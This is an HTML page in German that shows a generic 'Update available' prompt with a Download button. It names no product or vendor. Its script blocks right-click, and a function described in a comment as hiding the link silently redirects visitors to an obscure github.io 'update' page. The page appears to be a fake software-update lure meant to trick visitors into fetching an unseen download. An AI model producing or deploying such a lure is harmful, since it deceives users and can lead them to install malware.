
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Verfügbar</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #1e1e1e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 2.5em;
            color: #1e90ff;
            margin: 20px 0 10px;
        }
        p {
            font-size: 1.2em;
            margin: 20px 0;
        }
        button {
            padding: 15px 30px;
            font-size: 1em;
            color: #fff;
            background-color: #ff5722;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            position: relative;
            overflow: hidden;
        }
        button:hover {
            background-color: #e64a19;
            transform: scale(1.05);
        }
        button::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.2);
            opacity: 0;
            transition: opacity 0.3s;
            border-radius: 5px;
        }
        button:hover::after {
            opacity: 1;
        }
        .icon {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
        }
    </style>
    <script>
        // Deaktiviert den Rechtsklick
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Funktion zum Verhindern des Link-Anzeigens
        function openLink(event) {
            event.preventDefault();
            window.location.href = "https://emilia88o.github.io/updaterapplication9014127/update.html";
        }
    </script>
</head>
<body>

    <div class="container">
        <!-- Update Symbol als SVG -->
        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 0C5.373 0 0 5.373 0 12c0 6.627 5.373 12 12 12 6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-5.529 0-10-4.471-10-10S6.471 2 12 2s10 4.471 10 10-4.471 10-10 10zM11 7h2v4h-2zm0 5h2v2h-2z"/>
        </svg>
        <h1>Update verfügbar!</h1>
        <p>Bitte aktualisieren Sie auf die neue Version.</p>
        <button onclick="openLink(event)">Download</button>
    </div>

</body>
</html>
